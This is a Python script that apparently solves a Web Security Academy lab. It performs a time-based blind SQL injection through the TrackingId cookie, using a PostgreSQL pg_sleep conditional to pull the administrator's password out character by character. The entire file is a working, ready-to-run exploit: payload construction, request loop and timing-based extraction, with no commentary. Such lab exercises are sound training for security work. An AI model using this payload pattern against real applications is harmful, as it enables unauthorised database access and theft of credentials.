import requests

url = 'https://0a5800c0031d1912801c85c600ff00f8.web-security-academy.net/filter?category=Toys+%26+Games'
trackingId = 'v34rsEiD3nQwMsa0'
session = 'ymmptbCjLJBsgKfmstyYJiHBmkEJprW9'

alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
            "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

password = ""
password_length = 20

while len(password) < password_length:
    position = len(password) + 1
    for alp in alphabet: 
        payload = f"{trackingId}'||(select case when(substring((select password from users where username='administrator'),{position},1)='{alp}') then pg_sleep(3) else pg_sleep(0) end)--"
        request = requests.get(url, cookies = {"TrackingId": payload, "session": session} )
        if  request.elapsed.total_seconds() > 1:
            password = password + alp
            print(alp)
            break

print(password)